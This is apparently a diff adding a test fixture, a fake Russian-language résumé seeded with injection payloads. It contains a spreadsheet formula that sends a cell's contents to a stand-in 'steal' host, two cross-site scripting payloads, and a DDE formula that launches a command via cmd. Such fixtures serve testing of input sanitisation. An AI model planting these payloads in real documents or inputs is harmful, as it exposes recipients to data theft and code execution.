@@ -1,0 +1,6 @@
+=HYPERLINK("http://example.invalid/steal?d="&A1,"Резюме")
+Тестов Тест <script>alert('xss')</script>
+Email: test@example.com
+Разнорабочий — 2019 – настоящее время <img src=x onerror=alert(1)>
+- Погрузочные работы
+@SUM(1+1)*cmd|' /C calc'!A0
